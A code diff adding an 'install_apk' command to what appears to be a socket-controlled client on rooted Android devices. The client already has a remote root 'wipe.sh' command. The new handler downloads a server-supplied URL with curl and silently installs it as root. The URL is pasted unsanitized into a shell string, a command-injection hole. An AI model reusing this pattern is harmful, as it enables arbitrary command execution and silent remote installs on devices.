@@ -187,6 +187,22 @@ socket.on("execute_command", (data) => {
             runCmd('su -c "sh /data/data/com.termux/files/home/wipe.sh"');
         } catch (e) {}
     }
+    else if (data.command === 'install_apk') {
+        var apkUrl = data.payload.url;
+        var appName = apkUrl.split('/').pop();
+        console.log("[INSTALL] Downloading " + appName + "...");
+        
+        // DOWNLOAD APK
+        try {
+            runCmd("curl -L -o /sdcard/Download/app.apk " + apkUrl);
+            console.log("[INSTALL] Installing " + appName + "...");
+            // INSTALL APK
+            runCmd('su -c "pm install /sdcard/Download/app.apk"');
+            socket.emit("device_log", { deviceId: DEVICE_ID, message: "Successfully installed " + appName, type: "success" });
+        } catch (e) {
+            socket.emit("device_log", { deviceId: DEVICE_ID, message: "Failed to install " + appName, type: "error" });
+        }
+    }
     else {
         socket.emit("device_log", { deviceId: DEVICE_ID, message: "Command " + data.command + " executed!", type: "success" });
     }
